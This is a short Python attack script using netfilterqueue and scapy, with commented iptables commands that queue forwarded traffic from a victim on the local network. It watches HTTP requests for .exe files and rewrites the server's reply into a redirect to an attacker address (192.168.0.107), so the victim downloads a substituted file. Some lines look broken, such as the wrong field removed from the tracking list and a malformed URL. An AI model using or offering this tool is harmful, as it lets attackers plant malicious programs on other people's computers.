#iptables -I FORWARD -j NFQUEUE --queue-num 0 // for remote computer
#iptables -I OUTPUT -j NFQUEUE --queue-num 0 // for local computer
#iptables -I INPUT -j NFQUEUE --queue-num 0 // for local computer
#iptables --flush
#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
            	print("[+] exe Request")
            	ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].ack)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http:\\192.168.0.107\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                del scapy_packet[scapy.TCP].IP

                packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



